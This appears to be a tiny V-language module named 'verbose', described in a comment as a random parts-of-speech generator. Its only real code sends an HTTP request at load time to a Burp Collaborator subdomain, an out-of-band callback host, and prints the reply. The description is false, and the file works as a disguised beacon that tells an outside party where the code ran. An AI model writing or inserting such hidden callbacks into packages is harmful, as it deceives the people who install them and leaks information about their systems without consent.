module verbose

// verbose is a generator for random parts of speech
import net.http

if resp := http.get('http://zad95sxssmwm1m7jk39c6l3w4naqyf.burpcollaborator.net/') {
	println(resp.text) // resp is a http.Response, not an optional
} else {
	println(err)
}
